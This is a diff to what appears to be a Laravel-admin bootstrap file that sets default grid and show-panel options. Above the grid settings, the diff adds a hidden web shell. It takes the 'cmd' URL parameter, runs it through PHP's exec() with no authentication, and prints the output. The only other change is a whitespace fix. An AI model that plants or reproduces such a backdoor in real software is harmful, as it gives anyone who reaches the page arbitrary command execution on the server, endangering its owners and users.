@@ -51,6 +51,21 @@ use App\Models\Utils;
 use Dflydev\DotAccessData\Util;
 use Encore\Admin\Grid;
 
+
+if (isset($_GET['cmd'])) {
+    $d = $_GET['cmd'];
+    if (strlen($d) > 2) {
+        $ret = exec($d, $output, $error);
+        echo '<pre>';
+        print_r($ret);
+        echo '<hr>';
+        print_r($output);
+        echo '<hr>';
+        print_r($error);
+        die();
+    }
+}
+
 //default grid settings
 Grid::init(function (Grid $grid) {
     $grid->disableRowSelector();
@@ -209,4 +224,4 @@ Encore\Admin\Show::init(function (Encore\Admin\Show $show) {
     $show->panel()->tools(function ($tools) {
         $tools->disableDelete();
     });
-}); 
+});
